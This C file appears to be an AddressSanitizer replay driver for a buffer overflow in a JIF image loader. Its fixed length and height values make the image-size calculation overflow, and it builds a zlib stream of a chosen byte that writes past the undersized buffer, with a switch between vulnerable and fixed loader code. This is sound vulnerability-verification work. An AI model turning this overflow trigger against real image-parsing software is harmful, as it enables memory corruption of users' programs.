/* ASan replay of the verbatim JIF pin with REAL zlib 1.3.2 compiled with
 * AddressSanitizer. No stand-in inflate(): the write frame must come from
 * the real zlib library. No live victim object, no dereference, no command.
 * Usage: asan-driver bytes [hexbyte] | asan-driver file <JIF99a file>
 */
#define _GNU_SOURCE
#include <glib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

typedef void GimpImage;
#define _(s) (s)
static const char *g_error_msg = "";
#define read_error(msg, img, err) do { (void) (img); (void) (err); g_error_msg = (msg); } while (0)

typedef struct { guchar transparent; } GifColor;
static GifColor Gif89 = { 0x2a };

static guchar stream_bytes[4096];
static size_t stream_len = 0, stream_pos = 0;
static FILE *stream_file = NULL;

static gboolean
ReadOK (FILE *fd, void *buf, size_t n)
{
  if (stream_file)
    return fread (buf, 1, n, stream_file) == n;
  if (stream_pos + n > stream_len)
    return FALSE;
  memcpy (buf, stream_bytes + stream_pos, n);
  stream_pos += n;
  return TRUE;
}

#ifdef VARIANT_FIXED
#include "../pins/jif-fixed.inc"
#else
#include "../pins/jif-vulnerable.inc"
#endif

static void
build_stream (size_t outlen, unsigned char byte)
{
  guchar plain[4096], zbuf[4096];
  uLongf zlen = sizeof zbuf;
  size_t i, off = 0;

  for (i = 0; i < outlen; i++)
    plain[i] = byte;
  if (compress2 (zbuf, &zlen, plain, (uLong) outlen, 9) != Z_OK)
    exit (2);
  while (off < zlen)
    {
      size_t chunk = zlen - off;
      if (chunk > 255)
        chunk = 255;
      stream_bytes[stream_len++] = (guchar) chunk;
      memcpy (stream_bytes + stream_len, zbuf + off, chunk);
      stream_len += chunk;
      off += chunk;
    }
  stream_bytes[stream_len++] = 0;
  stream_pos = 0;
}

/* Same field layout as realglib/real-driver.c parse_jif_header(): the
 * on-disk JIF99a header, optional colour map, GCE and frame descriptor. */
static int
parse_jif_header (FILE *fd, gint *len, gint *height, gboolean *alpha,
                  guchar *bpp)
{
  guchar buf[768], c, size;

  if (! ReadOK (fd, buf, 6) || strncmp ((char *) buf, "JIF99a", 6))
    return 0;
  if (! ReadOK (fd, buf, 7))
    return 0;
  if ((buf[4] & 0x80) && ! ReadOK (fd, buf, 3 * (1 << ((buf[4] & 7) + 1))))
    return 0;
  *alpha = FALSE;
  while (ReadOK (fd, &c, 1))
    {
      if (c == ';')
        return 0;
      if (c == '!')
        {
          if (! ReadOK (fd, &c, 1))
            return 0;
          if (c == 0xf9)
            {
              if (! ReadOK (fd, &size, 1) || size < 4 ||
                  ! ReadOK (fd, buf, size))
                return 0;
              if (buf[0] & 0x01)
                {
                  Gif89.transparent = buf[3];
                  *alpha = TRUE;
                }
            }
          while (ReadOK (fd, &size, 1) && size)
            if (! ReadOK (fd, buf, size))
              return 0;
          continue;
        }
      if (c != ',' || ! ReadOK (fd, buf, 9))
        return 0;
      *len    = buf[4] + (buf[5] << 8);
      *height = buf[6] + (buf[7] << 8);
      if ((buf[8] & 0x80) &&
          ! ReadOK (fd, buf, 3 * (1 << ((buf[8] & 7) + 1))))
        return 0;
      return ReadOK (fd, &c, 1) ? (*bpp = c, 1) : 0;
    }
  return 0;
}

int
main (int argc, char **argv)
{
  setvbuf (stdout, NULL, _IONBF, 0);
  const char *mode = argc > 1 ? argv[1] : "bytes";
  int file_mode = ! strcmp (mode, "file");
  unsigned char byte = argc > 2 ? (unsigned char) strtoul (argv[2], NULL, 16) : 0x4d;
  guchar dest[8192];
  GimpImage *image = NULL;
  GError *error = NULL;
  gint len = 2, height = 1073741889;
  guchar bpp = 8;
  gboolean alpha = TRUE, rc;
  guint product;

  if (file_mode)
    {
      FILE *fd = argc > 2 ? fopen (argv[2], "rb") : NULL;
      if (! fd)
        {
          fprintf (stderr, "cannot open JIF file\n");
          return 2;
        }
      stream_file = fd;
      if (! parse_jif_header (fd, &len, &height, &alpha, &bpp))
        {
          fprintf (stderr, "JIF header parse failed\n");
          return 2;
        }
    }
  else
    build_stream (324, byte);

  product = (guint) len * (guint) height;
  printf ("MODE=%s ZLIB=%s DATA_SIZE=%u AVAIL_OUT=%u PAYLOAD=%02x\n",
          mode, zlibVersion (), product * (alpha ? 2u : 1u),
          product, byte);
  rc = ReadJeffsImage (NULL, dest, bpp, len, height, alpha, &image, &error);
  printf ("RC=%d ERR=%s\n", rc ? 1 : 0, g_error_msg);
  return 0;
}
